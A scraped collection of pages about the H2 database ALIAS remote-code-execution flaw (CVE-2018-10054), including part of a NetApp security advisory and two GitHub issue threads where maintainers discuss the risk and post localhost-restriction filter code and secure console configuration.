* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG5812/SG5860
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* StorageGRID Baseboard Management Controller (BMC) SG5812/SG5860
* System Manager 9.x
* Terraform Provider for ONTAP
* Workload Factory for VMware

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **Brocade SAN Navigator (SANnav)** | Fixed in SANnav 2.2.0. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20240719-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20240719 | Initial Public Release |
| 2.0 | 20240726 | MetroCluster Tiebreaker for clustered Data ONTAP moved to Products Not Affected |
| 3.0 | 20240801 | Active IQ Unified Manager for Microsoft Windows, Active IQ Unified Manager for Linux, and Active IQ Unified Manager for VMware vSphere moved to Products Not Affected |
| 4.0 | 20241030 | Brocade SAN Navigator (SANnav) Firmware added to Software Versions and Fixes |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from lists.apache.org_707fa4a7_20250110_111424.html ===


[![Foal logo](images/logo.png)](./)

* ![Display Settings](images/cog.png "Display Settings")
  **Email display mode:**

  ---

   Modern rendering

   Legacy rendering
* ![Logged out](images/user_loggedout.png "Not logged in")

This site requires JavaScript enabled. Please enable it.



=== Content from github.com_613ad700_20250110_111423.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F3099)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F3099)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=h2database%2Fh2database)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[h2database](/h2database)
/
**[h2database](/h2database/h2database)**
Public

* [Notifications](/login?return_to=%2Fh2database%2Fh2database) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fh2database%2Fh2database)
* [Star
   4.3k](/login?return_to=%2Fh2database%2Fh2database)

* [Code](/h2database/h2database)
* [Issues
  361](/h2database/h2database/issues)
* [Pull requests
  17](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects
  0](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

Additional navigation options

* [Code](/h2database/h2database)
* [Issues](/h2database/h2database/issues)
* [Pull requests](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Remote code execution #3099

Closed

[juliahayward](/juliahayward) opened this issue
Apr 27, 2021
· 3 comments

Closed

# [Remote code execution](#top) #3099

[juliahayward](/juliahayward) opened this issue
Apr 27, 2021
· 3 comments

## Comments

[![@juliahayward](https://avatars.githubusercontent.com/u/454881?s=80&v=4)](/juliahayward)

Copy link

### **[juliahayward](/juliahayward)** commented [Apr 27, 2021](#issue-868830750)

| <https://snyk.io/vuln/SNYK-JAVA-COMH2DATABASE-31685> reports an RCE vulnerability <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10054> , which in turn is failing our builds. Has this been fixed, and if not is it likely to be? |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Apr 27, 2021](#issuecomment-827610447)

| That is an RCE is the same sense as leaving your front door open and unlocked and going on holiday is an RCE. |
| --- |

All reactions

Sorry, something went wrong.

[![@juliahayward](https://avatars.githubusercontent.com/u/454881?s=80&v=4)](/juliahayward)

Copy link

Author

### **[juliahayward](/juliahayward)** commented [Apr 27, 2021](#issuecomment-827614396)

| OK, but if it's only a vulnerability in that it lets you shoot yourself in the foot, how do you go about getting it cleared off automated scanning systems? Some of our users scan what we ship, they see the report linked, they say it's unacceptable. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Apr 27, 2021](#issuecomment-827654182)

| This is largely a problem with whatever web framework you are using, because they are using H2 with insecure defaults.  So feel free to log the bug there. |
| --- |

All reactions

Sorry, something went wrong.

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=40&v=4)](/grandinj)
[grandinj](/grandinj)
closed this as [completed](/h2database/h2database/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Apr 27, 2021](#event-4651241198)

[![@codespearhead](https://avatars.githubusercontent.com/u/72931357?s=40&v=4)](/codespearhead)
[codespearhead](/codespearhead)
mentioned this issue
[Oct 16, 2024](#ref-issue-2590237858)

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#33972](/keycloak/keycloak/issues/33972)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F3099)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@juliahayward](https://avatars.githubusercontent.com/u/454881?s=52&v=4)](/juliahayward) [![@grandinj](https://avatars.githubusercontent.com/u/796121?s=52&v=4)](/grandinj)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7c52b1a5_20250110_111420.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1225)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fh2database%2Fh2database%2Fissues%2F1225)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=h2database%2Fh2database)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[h2database](/h2database)
/
**[h2database](/h2database/h2database)**
Public

* [Notifications](/login?return_to=%2Fh2database%2Fh2database) You must be signed in to change notification settings
* [Fork
  1.2k](/login?return_to=%2Fh2database%2Fh2database)
* [Star
   4.3k](/login?return_to=%2Fh2database%2Fh2database)

* [Code](/h2database/h2database)
* [Issues
  361](/h2database/h2database/issues)
* [Pull requests
  17](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects
  0](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

Additional navigation options

* [Code](/h2database/h2database)
* [Issues](/h2database/h2database/issues)
* [Pull requests](/h2database/h2database/pulls)
* [Actions](/h2database/h2database/actions)
* [Projects](/h2database/h2database/projects)
* [Security](/h2database/h2database/security)
* [Insights](/h2database/h2database/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fh2database%2Fh2database%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# CVE-2018-10054 CVSSv3 8.8! #1225

Closed

[cdaller](/cdaller) opened this issue
Jun 21, 2018
· 3 comments

Closed

# [CVE-2018-10054 CVSSv3 8.8!](#top) #1225

[cdaller](/cdaller) opened this issue
Jun 21, 2018
· 3 comments

## Comments

[![@cdaller](https://avatars.githubusercontent.com/u/1531978?s=80&u=8e9dfddd37692fcd1a20d6886787e899eb310672&v=4)](/cdaller)

Copy link

### **[cdaller](/cdaller)** commented [Jun 21, 2018](#issue-334412053)

| The latest version of h2 has a serious security warning: CVSSv3 of 8.8!  <https://nvd.nist.gov/vuln/detail/CVE-2018-10054>  The reason is that the ALIAS functionality can be misused to execute arbitrary java code on the system. If the h2-web-console is not protected by username/password and is accessible not only from localhost this leads to a serious security leak.  As lots of h2 web consoles are running in the above configuration during development, all developers might be attacked by other people on the same network having access to the system of the developer via web browser.  Good documentation of the attack is here: <https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html>  The problem is that the security issue is a feature, not a bug. The real problem is the configuration of the h2 web console! Still, current owasp dependency check reports h2 library in version 1.4.197 as vulnerable. In reality this applies to all versions of the library.  Suggestion to mitigate the attack:   * set a good password to the database. This is not working in our environment as we use h2 as a development database and the username/password is configured in the application configuration - accessible for all developers. So another developer can still access the h2 console. * restrict access to the h2 console to localhost   Here is a piece of code (from our jhipster project) that does so:  ``` ServletRegistration.Dynamic h2ConsoleServlet =                         servletContext.addServlet("H2Console", new org.h2.server.web.WebServlet());         h2ConsoleServlet.addMapping("/h2-console/*");         h2ConsoleServlet.setInitParameter("-properties", "src/main/resources/");         h2ConsoleServlet.setLoadOnStartup(1);          // prevent access to h2-console from network - this is a security leak as others could execute java code on developer machine:         // see CVE-2018-10054         // exploit & description: https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html         FilterRegistration.Dynamic localhostFilter = servletContext.addFilter("localhostFilter", new LocalhostOnlyFilter());         localhostFilter.addMappingForUrlPatterns(disps, true, "/h2-console/*");         localhostFilter.setAsyncSupported(true); ```  ``` import java.io.IOException;  import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.HttpServletResponse;  public class LocalhostOnlyFilter implements Filter {      @Override     public void init(FilterConfig filterConfig) throws ServletException {      }      @Override     public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {         if (request.getServerName().equals("localhost")) {             chain.doFilter(request, response);         } else {             HttpServletResponse httpResponse = (HttpServletResponse) response;             httpResponse.sendError(HttpServletResponse.SC_FORBIDDEN, "Access restricted to localhost");         }     }      @Override     public void destroy() {      } } ```  h2 web console should be restricted to localhost by default, therefore if someone wants access more open, he must configure that explicitly ("security by default"). |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@grandinj](https://avatars.githubusercontent.com/u/796121?s=80&v=4)](/grandinj)

Copy link

Contributor

### **[grandinj](/grandinj)** commented [Jun 21, 2018](#issuecomment-399040370)

| h2 is not designed to be run outside of a secure environment.  That said, this sounds like a reasonable thing to do. |
| --- |

All reactions

Sorry, something went wrong.

[![@katzyn](https://avatars.githubusercontent.com/u/23182944?s=80&v=4)](/katzyn)

Copy link

Contributor

### **[katzyn](/katzyn)** commented [Jun 21, 2018](#issuecomment-399056770) • edited Loading

| h2 web console should be restricted to localhost by default  It is restricted to localhost by default in H2.   [h2database/h2/src/main/org/h2/server/web/WebServer.java](https://github.com/h2database/h2database/blob/f97a3dcc856c012b45112cea48d0f1e1bc5518b4/h2/src/main/org/h2/server/web/WebServer.java#L279-L280)  Lines 279 to 280 in [f97a3dc](/h2database/h2database/commit/f97a3dcc856c012b45112cea48d0f1e1bc5518b4)   |  | allowOthers = SortedProperties.getBooleanProperty(prop, | | --- | --- | |  | "webAllowOthers", false); |      [h2database/h2/src/main/org/h2/server/web/WebServlet.java](https://github.com/h2database/h2database/blob/f97a3dcc856c012b45112cea48d0f1e1bc5518b4/h2/src/main/org/h2/server/web/WebServlet.java#L58-L72)  Lines 58 to 72 in [f97a3dc](/h2database/h2database/commit/f97a3dcc856c012b45112cea48d0f1e1bc5518b4)   |  | private boolean allow(HttpServletRequest req) { | | --- | --- | |  | if (server.getAllowOthers()) { | |  | return true; | |  | } | |  | String addr = req.getRemoteAddr(); | |  | try { | |  | InetAddress address = InetAddress.getByName(addr); | |  | return address.isLoopbackAddress(); | |  | } catch (UnknownHostException e) { | |  | return false; | |  | } catch (NoClassDefFoundError e) { | |  | // Google App Engine does not allow java.net.InetAddress | |  | return false; | |  | } | |  | } |     Anyone who enables a remote access to it by passing `webAllowOthers` parameter to servlet directly or by passing a configuration file that contains such parameters with `-properties` should also configure appropriate security constraints. Reinvention of wheel in such additional filter is not needed, existing configuration should be checked instead.   With plain default configuration remote access is not allowed:  ``` 	<servlet> 		<servlet-name>H2Console</servlet-name> 		<servlet-class>org.h2.server.web.WebServlet</servlet-class> 	</servlet> 	<servlet-mapping> 		<servlet-name>H2Console</servlet-name> 		<url-pattern>/db/*</url-pattern> 	</servlet-mapping> ```  H2 Console Sorry, remote connections ('webAllowOthers') are disabled on this server.  Remote access can be enabled in safe way:  ``` 	<servlet> 		<servlet-name>H2Console</servlet-name> 		<servlet-class>org.h2.server.web.WebServlet</servlet-class> 		<init-param> 			<param-name>webAllowOthers</param-name> 			<param-value></param-value> 		</init-param> 		<init-param> 			<param-name>ifExists</param-name> 			<param-value></param-value> 		</init-param> 	</servlet> 	<servlet-mapping> 		<servlet-name>H2Console</servlet-name> 		<url-pattern>/db/*</url-pattern> 	</servlet-mapping> 	<security-role> 		<role-name>admin</role-name> 	</security-role> 	<security-constraint> 		<web-resource-collection> 			<web-resource-name>H2 Console</web-resource-name> 			<url-pattern>/db/*</url-pattern> 		</web-resource-collection> 		<auth-constraint> 			<role-name>admin</role-name> 		</auth-constraint> 		<user-data-constraint> 			<transport-guarantee>CONFIDENTIAL</transport-guarantee> 		</user-data-constraint> 	</security-constraint> 	<login-config> 		<auth-method>BASIC</auth-method> 	</login-config> ```  But such non-default configuration from `jhipster-sample-app` is definitely not safe: <https://github.com/jhipster/jhipster-sample-app/blob/b4bb10fce794c5a56ea6d158fcb0910e622b42a4/src/main/resources/.h2.server.properties#L3-L5>  ``` webAllowOthers=true webPort=8082 webSSL=false  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

All reactions

Sorry, something went wrong.

[![@cdaller](https://avatars.githubusercontent.com/u/1531978?s=80&u=8e9dfddd37692fcd1a20d6886787e899eb310672&v=4)](/cdaller)

Copy link

Author

### **[cdaller](/cdaller)** commented [Jun 21, 2018](#issuecomment-399143239)

| thanks for pointing me to the properties file - changed webAllowedOthers to false and everything was as wanted |
| --- |

All reactions

Sorry, something went wrong.

[![@cdaller](https://avatars.githubusercontent.com/u/1531978?s=40&u=8e9dfddd37692fcd1a20d6886787e899eb310672&v=4)](/cdaller)
[cdaller](/cdaller)
closed this as [completed](/h2database/h2database/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Jun 21, 2018](#event-1693963480)

[![@danielpetisme](https://avatars.githubusercontent.com/u/593564?s=40&v=4)](/danielpetisme)
[danielpetisme](/danielpetisme)
mentioned this issue
[Sep 19, 2018](#ref-issue-358029678)

[Fix current CVEs
jhipster/generator-jhipster#8248](/jhipster/generator-jhipster/issues/8248)

Closed

1 task

This was referenced Nov 21, 2019

[Vulnerability fixes
delphi-hub/delphi-registry#139](/delphi-hub/delphi-registry/pull/139)
 Closed

[Vulnerability fix
delphi-hub/delphi-registry#140](/delphi-hub/delphi-registry/pull/140)
 Merged

[![@pjfanning](https://avatars.githubusercontent.com/u/11783444?s=40&v=4)](/pjfanning)
[pjfanning](/pjfanning)
mentioned this issue
[Jan 28, 2021](#ref-issue-796028047)

[h2 database vulnerability
pjfanning/poi-shared-strings#6](/pjfanning/poi-shared-strings/issues/6)

Closed

[![@RadixSeven](https://avatars.githubusercontent.com/u/733785?s=40&v=4)](/RadixSeven)
[RadixSeven](/RadixSeven)
mentioned this issue
[Mar 25, 2021](#ref-issue-425288167)

[Arbitrary Code Execution Security issue
#1831](/h2database/h2database/issues/1831)

Closed

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[Mar 4, 2022](#ref-issue-1159979653)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/AST\_BookStore#87](/cxronen/AST_BookStore/issues/87)

Open

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[Sep 20, 2022](#ref-issue-1379902612)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore\_VSCode#124](/cxronen/BookStore_VSCode/issues/124)

Open

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[Dec 20, 2022](#ref-issue-1504808026)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore#242](/cxronen/BookStore/issues/242)

Open

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[Feb 17, 2023](#ref-issue-1590073990)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore#522](/cxronen/BookStore/issues/522)

Open

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[Nov 22, 2022](#ref-issue-1460126759)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/AST\_BookStore#295](/cxronen/AST_BookStore/issues/295)

Open

This was referenced Mar 14, 2023

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore#679](/cxronen/BookStore/issues/679)

Open

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/AST\_BookStore#562](/cxronen/AST_BookStore/issues/562)

Open

This was referenced Feb 15, 2023

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore\_VSCode#339](/cxronen/BookStore_VSCode/issues/339)

Open

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore\_VSCode#532](/cxronen/BookStore_VSCode/issues/532)

Open

[![@cxronen](https://avatars.githubusercontent.com/u/32473724?s=40&v=4)](/cxronen)
[cxronen](/cxronen)
mentioned this issue
[May 25, 2023](#ref-issue-1726582195)

[CVE-2018-10054 @ Maven-com.h2database:h2-1.4.187
cxronen/BookStore\_VSCode#794](/cxronen/BookStore_VSCode/issues/794)

Open

[![@manticore-projects](https://avatars.githubusercontent.com/u/18080123?s=40&v=4)](/manticore-projects)
[manticore-projects](/manticore-projects)
mentioned this issue
[Mar 22, 2024](#ref-issue-2201599384)

[H2database snyk issue
#4029](/h2database/h2database/issues/4029)

Closed

This was referenced Oct 14, 2024

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#33860](/keycloak/keycloak/issues/33860)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#33918](/keycloak/keycloak/issues/33918)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#33971](/keycloak/keycloak/issues/33971)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak/keycloak#33972](/keycloak/keycloak/issues/33972)

Closed

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#446](/keycloak-poc/keycloak/issues/446)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#447](/keycloak-poc/keycloak/issues/447)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#452](/keycloak-poc/keycloak/issues/452)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#453](/keycloak-poc/keycloak/issues/453)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#458](/keycloak-poc/keycloak/issues/458)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#459](/keycloak-poc/keycloak/issues/459)

Open

26 hidden items

Load more…

This was referenced Nov 3, 2024

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#594](/keycloak-poc/keycloak/issues/594)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#606](/keycloak-poc/keycloak/issues/606)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#607](/keycloak-poc/keycloak/issues/607)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#615](/keycloak-poc/keycloak/issues/615)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#616](/keycloak-poc/keycloak/issues/616)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#623](/keycloak-poc/keycloak/issues/623)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#624](/keycloak-poc/keycloak/issues/624)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#631](/keycloak-poc/keycloak/issues/631)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
keycloak-poc/keycloak#632](/keycloak-poc/keycloak/issues/632)

Open

[CVE-2018-10054 - Remote Code Execution (RCE) in com.h2database:h2
